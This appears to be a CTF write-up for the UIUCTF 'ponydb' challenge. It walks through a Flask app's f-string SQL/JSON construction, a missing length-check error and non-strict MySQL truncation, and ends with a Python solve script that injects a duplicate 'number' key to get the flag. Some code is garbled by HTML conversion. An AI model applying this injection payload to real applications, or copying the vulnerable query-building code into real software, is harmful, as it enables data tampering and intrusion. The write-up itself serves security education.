@@ -1,0 +1,313 @@
+<hr />
+
+<h2>description: SQL injection and truncation attack</h2>
+
+<h1>ponydb</h1>
+
+<h2>Description</h2>
+
+<p>http://ponydb.chal.uiuc.tf</p>
+
+<p>(note: has unintended element that makes it slightly easier. see miniaturehorsedb for the full-difficulty challenge.)</p>
+
+<p><strong>author</strong>: kmh</p>
+
+<p>{% file src="../../.gitbook/assets/handout.tar.gz" %}
+handout.tar.gz
+{% endfile %}</p>
+
+<h2>Solution</h2>
+
+<h3>Source Code Analysis</h3>
+
+<p>We are provided with the source code for a Flask web application.</p>
+
+<p>First, a MySQL connection is established and a <code>ponies</code> table is created. The flag is also loaded into the <code>flag</code> variable.</p>
+
+<p>```python
+flag = os.environ['FLAG']</p>
+
+<p>config = {
+    'host': os.environ['DB<em>HOST'],
+    'user': os.environ['DB</em>USER'],
+    'password': os.environ['DB<em>PASS'],
+    'database': os.environ['DB'],
+    'sql</em>mode': 'NO<em>BACKSLASH</em>ESCAPES'
+}</p>
+
+<p>for i in range(30):
+    try:
+        conn = mysql.connector.connect(<strong>config)
+        break
+    except mysql.connector.errors.DatabaseError:
+        time.sleep(1)
+else: conn = mysql.connector.connect(</strong>config)
+cursor = conn.cursor()
+try: cursor.execute('CREATE TABLE <code>ponies</code> (<code>name</code> varchar(64), <code>bio</code> varchar(256), '
+                    '<code>image</code> varchar(256), <code>favorites</code> varchar(256), <code>session</code> varchar(64))')
+except mysql.connector.errors.ProgrammingError: pass
+cursor.close()
+conn.close()
+```</p>
+
+<p>There are two endpoints, <code>GET /</code> and <code>POST /pony</code>. Let's take a look at how they behave.</p>
+
+<h4>GET Endpoint</h4>
+
+<p>```python
+@app.route('/')
+def ponies():
+    cnx = mysql.connector.connect(**config)
+    cur = cnx.cursor()</p>
+
+<pre><code>if 'id' not in session:
+    session['id'] = secrets.token_hex(32)
+    cur.execute("INSERT INTO `ponies` VALUES ('Pwny', 'Pwny is the official mascot of SIGPwny!', "
+                "'https://sigpwny.github.io/images/logo.png', " + \
+                f"'{{\"color\":\"orange\",\"word\":\"pwn\",\"number\":13}}', '{session['id']}')")
+    cnx.commit()
+</code></pre>
+
+<p>```</p>
+
+<p>If a session ID has not yet been assigned, a secure one is generated and the <code>ponies</code> table in the database is populated with a default pony.&#x20;</p>
+
+<p>Interestingly, f-strings are used instead of <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries</a>. In this case, unfortunately, we do not have control over <code>session['id']</code>.&#x20;</p>
+
+<p>Note the unusual format of the <code>favorites</code> data - it is meant to be a JSON string. The default pony has the following <code>favorites</code> data:</p>
+
+<p><code>python
+{"color":"orange","word":"pwn","number":13}
+</code></p>
+
+<p>A <code>SELECT</code> statement is then used to fetch the ponies corresponding to the session ID. Notice that the <code>favorites</code> data is parsed by <code>json.loads()</code> into a Python dictionary.</p>
+
+<p>The ponies' data is stored into the <code>ponies</code> variable.</p>
+
+<p>``<code>python
+    ponies = []
+    cur.execute(f"SELECT * FROM</code>ponies` WHERE session='{session['id']}'")
+    for (name, bio, image, data, _) in cur:
+        ponies.append({"name": name, "bio": bio, "image": image, "favorites": json.loads(data)})</p>
+
+<pre><code>cur.close()
+cnx.close()
+</code></pre>
+
+<p>```</p>
+
+<p>Finally, the <code>ponies.html</code> template is rendered with the <code>ponies</code> and <code>flag</code> variables.</p>
+
+<p><code>python
+return render_template('ponies.html', ponies=ponies, flag=flag)
+</code></p>
+
+<p>In <code>ponies.html</code>, we find that <code>flag</code> is rendered under the condition that the pony's "favorite number" (the one stored in the JSON data) is 1337. This is the condition we have to bypass in order to solve the challenge.</p>
+
+<p><code>haskell
+{% raw %}
+{% for favorite in pony['favorites'] %}
+    &lt;p&gt;Favorite {{ favorite }}: {{ pony['favorites'][favorite] }}&lt;/p&gt;
+    {% if favorite == 'number' and pony['favorites'][favorite] == 1337 %}
+        &lt;p&gt;Favorite flag: {{ flag }}&lt;/p&gt;
+    {% endif %}
+{% endfor %}
+{% endraw %}
+</code></p>
+
+<h4>POST Endpoint</h4>
+
+<p>Now, if we look at the POST endpoint, we will start to get an idea of the intended exploit.</p>
+
+<p>There are 7 parameters to submit. Each one is checked for single quotes (<code>'</code>), and the length of the parameters are checked. While we have control over the <code>number</code> parameter, the validation ensures that it is an integer from 0 to 100, so we cannot simply set it to 1337.</p>
+
+<p>```python
+@app.route('/pony', methods=['POST'])
+def add():
+    error = None</p>
+
+<pre><code>name = request.form['name']
+if "'" in name: error = 'Name may not contain single quote'
+if len(name) &gt; 64: error = 'Name too long'
+
+bio = request.form['bio']
+if "'" in bio: error = 'Bio may not contain single quote'
+if len(bio) &gt; 256: error = 'Bio too long'
+
+image = request.form['image']
+if "'" in image: error = 'Image URL may not contain single quote'
+if len(image) &gt; 256: error = 'Image URL too long'
+
+favorite_key = request.form['favorite_key']
+if "'" in favorite_key: error = 'Custom favorite name may not contain single quote'
+if len(favorite_key) &gt; 64: 'Custom favorite name too long'
+
+favorite_value = request.form['favorite_value']
+if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
+if len(favorite_value) &gt; 64: 'Custom favorite too long'
+
+word = request.form['word']
+if "'" in word: error = 'Word may not contain single quote'
+if len(word) &gt; len('antidisestablishmentarianism'): error = 'Word too long'
+
+number = int(request.form['number'])
+if number &gt;= 100: error = "Ponies can't count that high"
+if number &lt; 0: error = "Ponies can't count that low"
+</code></pre>
+
+<p>```</p>
+
+<p>If the checks are passed, then the following <code>INSERT</code> statement is executed. Once again, f-strings are used instead of parameterized queries. This time, however, we have control over the variables through the POST request.&#x20;</p>
+
+<p><code>python
+if error: flash(error)
+    else:
+        cnx = mysql.connector.connect(**config)
+        cur = cnx.cursor()
+        cur.execute(f"INSERT INTO `ponies` VALUES ('{name}', '{bio}', '{image}', " + \
+                    f"'{{\"{favorite_key.lower()}\":\"{favorite_value}\"," + \
+                    f"\"word\":\"{word.lower()}\",\"number\":{number}}}', " + \
+                    f"'{session['id']}')")
+        cnx.commit()
+        cur.close()
+        cnx.close()
+</code></p>
+
+<p>While single quotes are filtered, we can easily escape out of the double quotes used in the JSON string. At first thought, we might think that we can simply inject a custom <code>"number": 1337</code> key-value pair to pass the number check in the Jinja template, thereby rendering the flag in the GET response.&#x20;</p>
+
+<p>For instance, if we submit <code>number":1337,"color</code> as the <code>favorite_key</code> parameter, the inserted JSON string would be:</p>
+
+<p><code>javascript
+{"number":1337,"color":"orange","word":"pwn","number":13}
+</code></p>
+
+<p>Unfortunately, as stated in the documentation, <code>json.loads()</code> handles repeated keys in JSON objects by ignoring everything except the last key-value pair.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-03 at 6.29.36 PM.png" alt="" /></p>
+
+<p>Therefore, while we might be able to inject a custom <code>number</code> key-value pair into the JSON string <em>stored in the database</em>, it will eventually be ignored when parsed by the <code>json</code> library.</p>
+
+<h4>The (Unintended) Fatal Flaw</h4>
+
+<p>It took us a few hours to spot this, but there was a flaw in the code. The <code>favorite_key</code> and <code>favorite_value</code> length checks actually don't produce any errors!</p>
+
+<p>The <code>error</code> variable should have been assigned as follows.</p>
+
+<p><code>python
+if len(favorite_value) &gt; 64: error = 'Custom favorite too long'
+</code></p>
+
+<p>Instead, the string was not assigned to any variable.</p>
+
+<p><code>python
+if len(favorite_value) &gt; 64: 'Custom favorite too long'
+</code></p>
+
+<p>Now, if we look back at the creation of the <code>ponies</code> table, we will find that the <code>favorites</code> column has a maximum length of 256.</p>
+
+<p><code>sql
+CREATE TABLE `ponies` ( ..., `favorites` varchar(256), ... )
+</code></p>
+
+<h4>The Ultimate Fatal Flaw</h4>
+
+<p>According to the <a href="https://dev.mysql.com/doc/refman/8.0/en/char.html">MySQL documentation</a>, if strict SQL mode is not enabled, assigning a VARCHAR value that exceeds the column length will cause the value to be truncated without raising an error.</p>
+
+<blockquote>
+  <p>If strict SQL mode is not enabled and you assign a value to a CHAR or VARCHAR column that exceeds the column's maximum length, the value is truncated to fit and a warning is generated. For truncation of nonspace characters, you can cause an error to occur (rather than a warning) and suppress insertion of the value by using strict SQL mode. See Section 5.1.11, “Server SQL Modes”.</p>
+</blockquote>
+
+<p>Note that while strict SQL mode is enabled by default, the <code>sql_mode</code> option was set to <code>'NO_BACKSLASH_ESCAPES'</code>.</p>
+
+<p>```python
+config = {</p>
+
+<pre><code>...
+
+'sql_mode': 'NO_BACKSLASH_ESCAPES'
+</code></pre>
+
+<p>}
+```</p>
+
+<p>As specified in the Python MySQL Connector <a href="https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlconnection-sql-mode.html">documentation</a>, this option should be a string of comma-separated modes. Evidently, the above configuration leaves out <code>STRICT_TRANS_TABLES</code> and <code>STRICT_ALL_TABLES</code>, either of which would have enabled strict SQL mode.</p>
+
+<h3>Exploitation</h3>
+
+<p>Let's revisit the earlier payload. We have <code>number":1337,"color</code> as <code>favorite_key</code>, which results in the following <code>favorites</code> string being inserted into the database:</p>
+
+<p><code>javascript
+{"number":1337,"color":"orange","word":"pwn","number":13}
+</code></p>
+
+<p>We can leverage the truncation to "push out" the final <code>"number":13</code> from the 256-character VARCHAR and insert a truncated string <em>without</em> the final key-value pair. This will resolve the repeated key problem when using <code>json.loads()</code>.</p>
+
+<p>My final solve script looked like this. We first set the <code>favorite_key</code> and <code>favorite_value</code>, with <code>favorite_key</code> containing the <code>"number": 1337</code> key-value pair and <code>favorite_value</code> ending in <code>"}</code>. Next, we create the JSON string up to <code>favorite_value</code>.&#x20;</p>
+
+<p>Then, we can calculate the number of remaining characters needed to complete the 256-character VARCHAR. This number of characters will be appended to the beginning of <code>favorite_value</code>.</p>
+
+<p>```python
+import json
+import requests
+import re</p>
+
+<p>name = 'test'
+bio = 'test'
+image = 'test'
+favorite<em>key = 'number":1337,"color'
+favorite</em>value = 'A"}'
+word = 'test'
+number = '1'
+session = {'id': 5}</p>
+
+<p>favorites = f"{{\"{favorite<em>key.lower()}\":\"{favorite</em>value}"</p>
+
+<p>length = len(favorites)
+print("Current length:", length, '\n')</p>
+
+<p>remaining = 256 - length
+favorite<em>value = 'A' * remaining + favorite</em>value</p>
+
+<p>print("favorite<em>value:", favorite</em>value, '\n')</p>
+
+<p>favorites = f"{{\"{favorite<em>key.lower()}\":\"{favorite</em>value}\"," + \
+                    f"\"word\":\"{word.lower()}\",\"number\":{number}}}"</p>
+
+<p>print("Length before truncation:", len(favorites), '\n')</p>
+
+<p>sql = f"INSERT INTO <code>ponies</code> VALUES ('{name}', '{bio}', '{image}', " + \
+                    f"'{{\"{favorite<em>key.lower()}\":\"{favorite</em>value}\"," + \
+                    f"\"word\":\"{word.lower()}\",\"number\":{number}}}', " + \
+                    f"'{session['id']}')"</p>
+
+<p>print("SQL statement:", sql, '\n')</p>
+
+<p>data = f"{{\"{favorite<em>key.lower()}\":\"{favorite</em>value}\"," + \
+                    f"\"word\":\"{word.lower()}\",\"number\":{number}}}"</p>
+
+<p>data = json.loads(data[:256])
+print("Parsed JSON:", data, '\n')</p>
+
+<p>s = requests.session()
+s.get("http://ponydb.chal.uiuc.tf")</p>
+
+<p>payload = {
+    "name": name,
+    "bio": bio,
+    "image": image,
+    "favorite<em>key": favorite</em>key,
+    "favorite<em>value": favorite</em>value,
+    "word": word,
+    "number": number
+}</p>
+
+<p>r = s.post("http://ponydb.chal.uiuc.tf/pony", data=payload)
+match = re.search(r"<p>Favorite flag: (.+)</p>", r.text)
+print(match[1])
+```</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-03 at 7.50.15 PM.png" alt="" /></p>
+
+<p>The last part of the script just automates the HTTP requests. We could, of course, submit the payload manually as well, and see our pony in all its glory.</p>
+
+<p><img src="../../.gitbook/assets/image (22).png" alt="" /></p>
